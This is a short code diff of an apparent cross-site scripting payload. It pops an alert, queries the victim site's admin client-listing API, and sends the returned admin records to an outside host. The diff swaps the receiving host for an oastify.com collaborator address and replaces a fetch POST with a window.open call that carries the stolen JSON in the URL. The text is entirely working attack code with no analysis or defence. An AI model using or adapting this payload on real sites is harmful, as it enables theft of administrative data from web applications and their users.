@@ -1,7 +1,7 @@
 alert(9);
 const dm = document.domain 
 const url = 'https://' + dm + '/api-v1/admin/listclients';
-const url2 = 'https://create-react-app-pjep-2wrhktcwy-r7840s-projects.vercel.app/'
+const url2 = 'https://fq9hqh46tjfbt53apv51tudscjib61uq.oastify.com/'
 
 const data = {"clienttype":"admin","upline_id":-1,"results":25};
 
@@ -23,15 +23,8 @@ async function postData(url = '', data = {}) {
     // Log the response
     console.log('Response:', jsonResponse.admin);
     
-    const response2 = await fetch(url2, {
-      method: 'POST', // Specify the method as POST
-      headers: {
-        'Content-Type': 'application/json', // Set the request content type to JSON
-        'Access-Control-Allow-Origin': '*',
-      },
-      mode: 'cors',
-      body: JSON.stringify(jsonResponse.admin), // Convert JavaScript object to JSON string
-    });
+   const data2 = JSON.stringify(jsonResponse.admin)
+    window.open(url2 + '=' + data2, '_blank');
     
   } catch (error) {
     // Handle any errors
